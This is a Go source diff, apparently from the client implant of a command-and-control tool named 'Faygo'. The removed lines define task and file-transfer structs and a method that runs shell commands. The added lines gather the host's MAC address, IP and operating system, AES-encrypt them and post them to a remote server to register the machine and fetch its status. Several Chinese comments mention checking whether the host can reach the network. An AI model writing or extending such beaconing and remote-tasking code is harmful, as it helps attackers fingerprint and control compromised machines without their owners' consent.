@@ -1,51 +1,68 @@
 package main
 
 import (
-	"Faygo/client/command"
+	net "Faygo/client/module/net"
 	"fmt"
-	"log"
+	"runtime"
 )
 
-//Client struct
-type Client struct {
-	Id         int    //clientid
-	Note       string //notename
-	OsType     string //windows,linux,drwin
-	MacAddress string //remotemac
-	Status     int    //0,1,2,3,4
-	Lasttask   int    //latest taskid
-}
-
-type Task struct {
-	Id            int
-	ClientId      int    //-> Client.Id
-	CommandLine   string // -> cmd task
-	CommandResult string // -> command result
-	CommandStatus int    //0,1
-}
-
-type FileTransfer struct {
-	Id             int    //FileID
-	ClientId       int    //->Client.Id
-	ReomteLocation string // "/tmp/test.file"
-	FileHex        string // hexed file
-	Status         int    // 0,1 TransferStatus
-}
-
-// RunCommand func,指针赋值
-func (t *Task) Runcommand() {
-	_, out, err := command.NewCommand().Exec(t.CommandLine)
-	if err != nil {
-		log.Panic(err)
-	}
-	t.CommandResult = out
-}
-
 func main() {
-	c := Task{
-		CommandLine: "ls -ll /",
-		//CommandResult: "",
+	//test()
+
+	// 基本标识信息赋值
+	c1 := Client{
+		Mac: GetMac(),
+		Lan: GetIP(),
+		Os:  runtime.GOOS,
 	}
-	c.Runcommand()
-	fmt.Println(c.CommandResult)
+
+	// GetTask(c1)
+
+	// 判断是否出网
+	// // fmt.Println(GetServer())
+	// if !GetServer() {
+	// 	os.Exit(0)
+	// }
+
+	// 获取信息 返回状态吗
+	response := c1.GetStatus()
+	fmt.Println(response)
+	dealtask := Client{}
+	dealtask.Json2Struct(response)
+	switch dealtask.Status {
+	// case 0 需要初始化
+	case 0:
+		fmt.Println(c1.InitClient())
+	case 1:
+		fmt.Println("case1")
+	default:
+		fmt.Println("error")
+	}
+
+}
+
+//OK
+func GetServer() bool {
+	//判断返回字符串
+	// return net.HttpGet(RemoteHost) == "{\"0\":\"0\"}"
+	return net.HttpGet(RemoteHost) == "200 OK"
+}
+
+func (c *Client) GetStatus() string {
+	//debug
+	fmt.Println(AesEnCode(Struct2Json(*c)))
+	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))
+
+}
+
+func GetTask(c Client) {
+	fmt.Println(Struct2Json(c))
+	net.HttpPost(RemoteHost, AesEnCode(Struct2Json(c)))
+
+}
+
+func (c *Client) InitClient() string {
+	c.Status = 1
+	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))
+
 }
